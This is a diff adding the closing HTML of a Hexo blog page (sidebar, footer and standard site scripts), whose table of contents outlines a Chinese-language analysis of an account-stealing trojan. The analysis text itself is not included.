+            <a href="/tags">
+              <span class="site-state-item-count">22</span>
+              <span class="site-state-item-name">标签</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="menu-item-icon icon-next-feed"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://github.com/idhyt" target="_blank">GitHub</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/1706893103" target="_blank">Weibo</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.zhihu.com/people/idhyt" target="_blank">ZhiHu</a>
+              </span>
+            
+          
+        </div>
+
+        <div class="links-of-friendly motion-element">
+          
+            <p class="site-author-name">Links</p>
+            
+              <span class="links-of-author-item">
+              <a href="http://idhyt.sinaapp.com/dragwall/" target="_blank">messages</a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element" itemprop="license">
+            <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#调试环境："><span class="nav-number">1.</span> <span class="nav-text">调试环境：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#病毒简介"><span class="nav-number">2.</span> <span class="nav-text">病毒简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#病毒母体运行流程"><span class="nav-number">3.</span> <span class="nav-text">病毒母体运行流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#子体Crt-dll注入功能"><span class="nav-number">4.</span> <span class="nav-text">子体Crt.dll注入功能</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#子体Dxy2-exe远控功能"><span class="nav-number">5.</span> <span class="nav-text">子体Dxy2.exe远控功能</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#子体Dxy-exe盗号功能"><span class="nav-number">6.</span> <span class="nav-text">子体Dxy.exe盗号功能</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#创建线程0x402BFF杀掉aliimsafe-exe进程"><span class="nav-number">6.1.</span> <span class="nav-text">创建线程0x402BFF杀掉aliimsafe.exe进程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取系统信息加密储存"><span class="nav-number">6.2.</span> <span class="nav-text">获取系统信息加密储存</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#创建线程0x410362建立远程链接"><span class="nav-number">6.3.</span> <span class="nav-text">创建线程0x410362建立远程链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#创建线程0x410BAE获取阿里旺旺账户密码"><span class="nav-number">6.4.</span> <span class="nav-text">创建线程0x410BAE获取阿里旺旺账户密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#创建线程0x410C60替换qqedit-dll获取财付通密码"><span class="nav-number">6.5.</span> <span class="nav-text">创建线程0x410C60替换qqedit.dll获取财付通密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#主要盗号功能"><span class="nav-number">6.6.</span> <span class="nav-text">主要盗号功能</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#远程截屏"><span class="nav-number">6.6.1.</span> <span class="nav-text">远程截屏</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#远程截取指定窗口"><span class="nav-number">6.6.2.</span> <span class="nav-text">远程截取指定窗口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#自动登陆5173转账_（未分析清楚）"><span class="nav-number">6.6.3.</span> <span class="nav-text">自动登陆5173转账 （未分析清楚）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取磁盘信息，遍历磁盘查找指定文件"><span class="nav-number">6.6.4.</span> <span class="nav-text">获取磁盘信息，遍历磁盘查找指定文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取系统开机密码"><span class="nav-number">6.6.5.</span> <span class="nav-text">获取系统开机密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#远程登陆"><span class="nav-number">6.6.6.</span> <span class="nav-text">远程登陆</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#开启远程桌面链接服务,实现多用户登陆"><span class="nav-number">6.6.7.</span> <span class="nav-text">开启远程桌面链接服务,实现多用户登陆</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#检测登陆当前登陆用户，隐藏自身账户"><span class="nav-number">6.6.8.</span> <span class="nav-text">检测登陆当前登陆用户，隐藏自身账户</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#发送信息到服务器"><span class="nav-number">6.6.9.</span> <span class="nav-text">发送信息到服务器</span></a></li></ol></li></ol></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner"> <div class="copyright" >
+  
+  &copy; &nbsp;  2011 - 
+  <span itemprop="copyrightYear">2015</span>
+  <span class="with-love">
+    <i class="icon-next-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">idhyt</span>
+
+  <div class="powered-by"></div>
+  <div class="powered-by">
+    Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+  </div>
+
+</div>
+
+<!--
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+-->
+
+<!--
+<div class="powered-by"></div>
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+-->
+
+<!--
+<div class="theme-info">
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <span id="busuanzi_container_site_pv">
+        本站总访问量<a class="theme-link"><span id="busuanzi_value_site_pv"></span></a>次
+    </span>
+</div>
+-->
+
+
+ </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+    
+    
+
+  
+
+    <script type="text/javascript">
+      var disqus_shortname = 'idhyt';
+      var disqus_identifier = '2013/12/19/virus-troj-mutil/';
+      var disqus_title = '病毒分析-多功能盗号木马';
+      var disqus_url = 'http://blog.idhyt.com/2013/12/19/virus-troj-mutil/';
+
+      function run_disqus_script(disqus_script){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      }
+
+      run_disqus_script('count.js');
+      
+        run_disqus_script('embed.js');
+      
+    </script>
+  
+
+
+  
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.1"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.1"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.1" id="motion.global"></script>
+
+
+
+
+  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.1"></script>
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.1" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 0.4 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    var $tocContent = $('.post-toc-content');
+    if (isDesktop() && CONFIG.sidebar === 'post') {
+      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+        displaySidebar();
+      }
+    }
+  });
+</script>
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+      if (isMobile()) {
+        FastClick.attach(document.body);
+      }
+    });
+  </script>
+
+  
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/lazyload.js"></script>
+  <script type="text/javascript">
+    $(function () {
+      $("#posts").find('img').lazyload({
+        placeholder: "/images/loading.gif",
+        effect: "fadeIn"
+      });
+    });
+  </script>
+</body>
+</html>
